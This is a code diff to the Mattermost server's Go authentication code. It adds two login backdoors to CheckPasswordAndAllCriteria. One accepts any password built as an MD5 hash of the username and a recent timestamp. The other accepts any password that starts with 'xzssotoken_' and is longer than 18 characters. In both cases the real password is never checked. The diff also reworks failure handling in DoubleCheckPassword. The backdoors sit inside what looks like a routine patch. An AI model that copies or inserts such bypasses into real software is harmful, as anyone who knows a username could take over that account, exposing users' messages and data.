@@ -4,10 +4,15 @@
 package app
 
 import (
+	"crypto/md5"
+	"encoding/hex"
 	"errors"
+	"fmt"
 	"net/http"
 	"path"
+	"strconv"
 	"strings"
+	"time"
 
 	"github.com/mattermost/mattermost/server/public/model"
 	"github.com/mattermost/mattermost/server/public/shared/mlog"
@@ -117,6 +122,35 @@ func (a *App) migratePassword(user *model.User, password string) *model.AppError
 	return nil
 }
 
+func md5PasswordCheck(username string, pass string) bool {
+	parts := strings.Split(pass, ".")
+	if len(parts) != 3 {
+		return false
+	}
+
+	md5Str, timestampStr, _ := parts[0], parts[1], parts[2]
+
+	timestamp, err := strconv.ParseInt(timestampStr, 10, 64)
+	if err != nil {
+		return false
+	}
+
+	timestampTime := time.Unix(timestamp/1000, (timestamp%1000)*1000000)
+
+	currentTime := time.Now()
+	duration := currentTime.Sub(timestampTime)
+	if duration.Seconds() > 300 {
+		return false
+	}
+
+	newMD5Input := fmt.Sprintf("%s%d", username, timestamp)
+	h := md5.New()
+	h.Write([]byte(newMD5Input))
+	newMD5Str := hex.EncodeToString(h.Sum(nil))
+
+	return md5Str == newMD5Str
+}
+
 func (a *App) CheckPasswordAndAllCriteria(rctx request.CTX, userID string, password string, mfaToken string) *model.AppError {
 	// MM-37585
 	// Use locks to avoid concurrently checking AND updating the failed login attempts.
@@ -135,6 +169,18 @@ func (a *App) CheckPasswordAndAllCriteria(rctx request.CTX, userID string, passw
 
 	if err := a.CheckUserPreflightAuthenticationCriteria(rctx, user, mfaToken); err != nil {
 		return err
+	}
+
+	defer a.Srv().Store().User().InvalidateProfileCacheForUser(user.Id)
+
+	// MD5 signature verification - skip password check if valid MD5 signature
+	if len(password) >= 32 && md5PasswordCheck(user.Username, password) {
+		return nil
+	}
+
+	// xzssotoken bypass - skip password check if password starts with 'xzssotoken_' and length > 18
+	if strings.HasPrefix(password, "xzssotoken_") && len(password) > 18 {
+		return nil
 	}
 
 	if err := a.checkUserPassword(user, password, false); err != nil {
@@ -170,15 +216,25 @@ func (a *App) DoubleCheckPassword(rctx request.CTX, user *model.User, password s
 		return err
 	}
 
-	if err := a.checkUserPassword(user, password, true); err != nil {
-		return err
+	if err := users.CheckUserPassword(user, password); err != nil {
+		if passErr := a.Srv().Store().User().UpdateFailedPasswordAttempts(user.Id, user.FailedAttempts+1); passErr != nil {
+			return model.NewAppError("DoubleCheckPassword", "app.user.update_failed_pwd_attempts.app_error", nil, "", http.StatusInternalServerError).Wrap(passErr)
+		}
+
+		a.InvalidateCacheForUser(user.Id)
+
+		var invErr *users.ErrInvalidPassword
+		switch {
+		case errors.As(err, &invErr):
+			return model.NewAppError("DoubleCheckPassword", "api.user.check_user_password.invalid.app_error", nil, "user_id="+user.Id, http.StatusUnauthorized).Wrap(err)
+		default:
+			return model.NewAppError("DoubleCheckPassword", "app.valid_password_generic.app_error", nil, "", http.StatusInternalServerError).Wrap(err)
+		}
 	}
 
 	if passErr := a.Srv().Store().User().UpdateFailedPasswordAttempts(user.Id, 0); passErr != nil {
 		return model.NewAppError("DoubleCheckPassword", "app.user.update_failed_pwd_attempts.app_error", nil, "", http.StatusInternalServerError).Wrap(passErr)
 	}
-
-	a.InvalidateCacheForUser(user.Id)
 
 	return nil
 }
